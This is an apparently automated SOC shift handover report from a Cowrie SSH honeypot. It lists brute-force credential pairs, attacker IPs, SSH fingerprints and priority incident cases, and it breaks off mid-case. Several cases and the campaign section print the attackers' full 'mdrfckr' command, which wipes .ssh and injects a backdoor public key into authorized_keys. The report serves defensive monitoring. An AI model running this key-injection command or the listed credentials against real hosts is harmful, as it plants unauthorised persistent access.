# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T18:59:54Z |
| **Shift Time** | 18:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **177** |
| Confirmed Threats | **146** |
| False Positives Filtered | **31** (17.5%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **9** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **119** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **146** |
| Unique Credential Pairs | **62** |
| Unique Usernames | **33** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **34** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 58 |
| `345gs5662d34` | 29 |
| `n8n` | 6 |
| `ftpuser` | 5 |
| `postgres` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 29 |
| `3245gs5662d34` | 29 |
| `123456` | 7 |
| `Oracle07!` | 3 |
| `1122` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `3245gs5662d34` | 29 |
| `oracle` | `Oracle07!` | 3 |
| `ubuntu` | `1122` | 2 |
| `postgres` | `password@123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qQ@12345678` | `152.32.154.31` | 2026-04-25T16:59:35 |
| `root` | `3245gs5662d34` | `152.32.154.31` | 2026-04-25T16:59:39 |
| `root` | `123!@#asdASD` | `152.32.154.31` | 2026-04-25T17:02:43 |
| `root` | `100` | `152.32.154.31` | 2026-04-25T17:03:40 |
| `root` | `school1` | `152.32.154.31` | 2026-04-25T17:05:37 |
| `root` | `root@admin123` | `152.32.154.31` | 2026-04-25T17:07:45 |
| `root` | `123qweasd@` | `152.32.154.31` | 2026-04-25T17:08:47 |
| `root` | `P@ssw0rd.1` | `152.32.154.31` | 2026-04-25T17:15:00 |
| `root` | `2glehe5t24th1issZs` | `147.139.209.109` | 2026-04-25T18:05:45 |
| `root` | `3245gs5662d34` | `147.139.209.109` | 2026-04-25T18:05:49 |
| `root` | `202500` | `147.139.209.109` | 2026-04-25T18:07:12 |
| `root` | `senha` | `147.139.209.109` | 2026-04-25T18:08:35 |
| `root` | `!QAZ@WSX1qaz2wsx` | `147.139.209.109` | 2026-04-25T18:12:39 |
| `root` | `1233211234` | `147.139.209.109` | 2026-04-25T18:19:26 |
| `root` | `ABcd@1234` | `178.128.18.100` | 2026-04-25T18:20:00 |
| `root` | `3245gs5662d34` | `178.128.18.100` | 2026-04-25T18:20:03 |
| `root` | `senha` | `129.121.77.79` | 2026-04-25T18:20:53 |
| `root` | `3245gs5662d34` | `129.121.77.79` | 2026-04-25T18:20:59 |
| `root` | `!QAZ@WSX1qaz2wsx` | `129.121.77.79` | 2026-04-25T18:21:45 |
| `root` | `Pa$$w0rd2025` | `147.139.209.109` | 2026-04-25T18:22:10 |
| `root` | `1233211234` | `129.121.77.79` | 2026-04-25T18:22:40 |
| `root` | `Pa$$w0rd2025` | `129.121.77.79` | 2026-04-25T18:23:30 |
| `root` | `MoeClub.org` | `147.139.209.109` | 2026-04-25T18:23:30 |
| `root` | `MoeClub.org` | `129.121.77.79` | 2026-04-25T18:24:21 |
| `root` | `Qwerty@123456` | `14.248.83.33` | 2026-04-25T18:24:35 |
| `root` | `3245gs5662d34` | `14.248.83.33` | 2026-04-25T18:24:38 |
| `root` | `Lq123456` | `147.139.209.109` | 2026-04-25T18:24:54 |
| `root` | `Xp123456` | `129.121.77.79` | 2026-04-25T18:25:10 |
| `root` | `Lq123456` | `129.121.77.79` | 2026-04-25T18:28:16 |
| `root` | `Xp123456` | `147.139.209.109` | 2026-04-25T18:33:00 |
| `root` | `admin1@3` | `147.139.209.109` | 2026-04-25T18:35:45 |
| `root` | `admin1@3` | `129.121.77.79` | 2026-04-25T18:36:35 |
| `root` | `202500` | `129.121.77.79` | 2026-04-25T18:38:14 |
| `root` | `2glehe5t24th1issZs` | `129.121.77.79` | 2026-04-25T18:39:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **177** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 163 |
| Go SSH scanner | 1 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 138 | 5 |
| `03a80b21afa8...` | Modern SSH client | 22 | 2 |
| `19532158b559...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 138 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 22 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 29 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.77.79`, `14.248.83.33`, `178.128.18.100`, `152.32.154.31`, `147.139.209.109`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **15** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | MEDIUM |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS45899` | VNPT Corp | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d9b925e568ce

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 16:59 |
| **Last Seen** | 2026-04-25 16:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 16:59:34` | `cowrie.session.connect` |
| `2026-04-25 16:59:34` | `cowrie.client.version` |
| `2026-04-25 16:59:34` | `cowrie.client.kex` |
| `2026-04-25 16:59:35` | `cowrie.login.success` |
| `2026-04-25 16:59:35` | `cowrie.session.params` |
| `2026-04-25 16:59:35` | `cowrie.command.input` |
| `2026-04-25 16:59:35` | `cowrie.command.failed` |
| `2026-04-25 16:59:35` | `cowrie.log.closed` |
| `2026-04-25 16:59:36` | `cowrie.session.params` |
| `2026-04-25 16:59:36` | `cowrie.command.input` |
| `2026-04-25 16:59:36` | `cowrie.session.file_download` |
| `2026-04-25 16:59:36` | `cowrie.log.closed` |
| `2026-04-25 16:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8a6683f60a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 16:59 |
| **Last Seen** | 2026-04-25 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 16:59:38` | `cowrie.session.connect` |
| `2026-04-25 16:59:38` | `cowrie.client.version` |
| `2026-04-25 16:59:39` | `cowrie.client.kex` |
| `2026-04-25 16:59:39` | `cowrie.login.success` |
| `2026-04-25 16:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4196591aa5

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:02 |
| **Last Seen** | 2026-04-25 17:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:02:42` | `cowrie.session.connect` |
| `2026-04-25 17:02:42` | `cowrie.client.version` |
| `2026-04-25 17:02:42` | `cowrie.client.kex` |
| `2026-04-25 17:02:43` | `cowrie.login.success` |
| `2026-04-25 17:02:43` | `cowrie.session.params` |
| `2026-04-25 17:02:43` | `cowrie.command.input` |
| `2026-04-25 17:02:43` | `cowrie.command.failed` |
| `2026-04-25 17:02:43` | `cowrie.log.closed` |
| `2026-04-25 17:02:44` | `cowrie.session.params` |
| `2026-04-25 17:02:44` | `cowrie.command.input` |
| `2026-04-25 17:02:44` | `cowrie.session.file_download` |
| `2026-04-25 17:02:44` | `cowrie.log.closed` |
| `2026-04-25 17:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-912ba3707ba1

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:02 |
| **Last Seen** | 2026-04-25 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:02:46` | `cowrie.session.connect` |
| `2026-04-25 17:02:46` | `cowrie.client.version` |
| `2026-04-25 17:02:47` | `cowrie.client.kex` |
| `2026-04-25 17:02:47` | `cowrie.login.success` |
| `2026-04-25 17:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13ac7c3cc1a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:03 |
| **Last Seen** | 2026-04-25 17:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:03:39` | `cowrie.session.connect` |
| `2026-04-25 17:03:39` | `cowrie.client.version` |
| `2026-04-25 17:03:39` | `cowrie.client.kex` |
| `2026-04-25 17:03:40` | `cowrie.login.success` |
| `2026-04-25 17:03:40` | `cowrie.session.params` |
| `2026-04-25 17:03:40` | `cowrie.command.input` |
| `2026-04-25 17:03:40` | `cowrie.command.failed` |
| `2026-04-25 17:03:40` | `cowrie.log.closed` |
| `2026-04-25 17:03:41` | `cowrie.session.params` |
| `2026-04-25 17:03:41` | `cowrie.command.input` |
| `2026-04-25 17:03:41` | `cowrie.session.file_download` |
| `2026-04-25 17:03:41` | `cowrie.log.closed` |
| `2026-04-25 17:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cdcb1f23865

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:03 |
| **Last Seen** | 2026-04-25 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:03:44` | `cowrie.session.connect` |
| `2026-04-25 17:03:44` | `cowrie.client.version` |
| `2026-04-25 17:03:44` | `cowrie.client.kex` |
| `2026-04-25 17:03:45` | `cowrie.login.success` |
| `2026-04-25 17:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3216af92492c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:05 |
| **Last Seen** | 2026-04-25 17:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:05:36` | `cowrie.session.connect` |
| `2026-04-25 17:05:36` | `cowrie.client.version` |
| `2026-04-25 17:05:36` | `cowrie.client.kex` |
| `2026-04-25 17:05:37` | `cowrie.login.success` |
| `2026-04-25 17:05:38` | `cowrie.session.params` |
| `2026-04-25 17:05:38` | `cowrie.command.input` |
| `2026-04-25 17:05:38` | `cowrie.command.failed` |
| `2026-04-25 17:05:38` | `cowrie.log.closed` |
| `2026-04-25 17:05:38` | `cowrie.session.params` |
| `2026-04-25 17:05:38` | `cowrie.command.input` |
| `2026-04-25 17:05:38` | `cowrie.session.file_download` |
| `2026-04-25 17:05:38` | `cowrie.log.closed` |
| `2026-04-25 17:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c5d4ab61bd

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:05 |
| **Last Seen** | 2026-04-25 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:05:41` | `cowrie.session.connect` |
| `2026-04-25 17:05:41` | `cowrie.client.version` |
| `2026-04-25 17:05:41` | `cowrie.client.kex` |
| `2026-04-25 17:05:42` | `cowrie.login.success` |
| `2026-04-25 17:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f16d03f920

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:07 |
| **Last Seen** | 2026-04-25 17:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:07:44` | `cowrie.session.connect` |
| `2026-04-25 17:07:44` | `cowrie.client.version` |
| `2026-04-25 17:07:44` | `cowrie.client.kex` |
| `2026-04-25 17:07:45` | `cowrie.login.success` |
| `2026-04-25 17:07:45` | `cowrie.session.params` |
| `2026-04-25 17:07:45` | `cowrie.command.input` |
| `2026-04-25 17:07:45` | `cowrie.command.failed` |
| `2026-04-25 17:07:45` | `cowrie.log.closed` |
| `2026-04-25 17:07:46` | `cowrie.session.params` |
| `2026-04-25 17:07:46` | `cowrie.command.input` |
| `2026-04-25 17:07:46` | `cowrie.session.file_download` |
| `2026-04-25 17:07:46` | `cowrie.log.closed` |
| `2026-04-25 17:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5258032ac8

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:07 |
| **Last Seen** | 2026-04-25 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:07:49` | `cowrie.session.connect` |
| `2026-04-25 17:07:49` | `cowrie.client.version` |
| `2026-04-25 17:07:49` | `cowrie.client.kex` |
| `2026-04-25 17:07:50` | `cowrie.login.success` |
| `2026-04-25 17:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1d7cff5fd82

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:08 |
| **Last Seen** | 2026-04-25 17:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:08:46` | `cowrie.session.connect` |
| `2026-04-25 17:08:46` | `cowrie.client.version` |
| `2026-04-25 17:08:46` | `cowrie.client.kex` |
| `2026-04-25 17:08:47` | `cowrie.login.success` |
| `2026-04-25 17:08:47` | `cowrie.session.params` |
| `2026-04-25 17:08:47` | `cowrie.command.input` |
| `2026-04-25 17:08:47` | `cowrie.command.failed` |
| `2026-04-25 17:08:47` | `cowrie.log.closed` |
| `2026-04-25 17:08:48` | `cowrie.session.params` |
| `2026-04-25 17:08:48` | `cowrie.command.input` |
| `2026-04-25 17:08:48` | `cowrie.session.file_download` |
| `2026-04-25 17:08:48` | `cowrie.log.closed` |
| `2026-04-25 17:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795c8b71c969

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:08 |
| **Last Seen** | 2026-04-25 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:08:50` | `cowrie.session.connect` |
| `2026-04-25 17:08:50` | `cowrie.client.version` |
| `2026-04-25 17:08:50` | `cowrie.client.kex` |
| `2026-04-25 17:08:51` | `cowrie.login.success` |
| `2026-04-25 17:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb2d38b90d7

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:14 |
| **Last Seen** | 2026-04-25 17:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
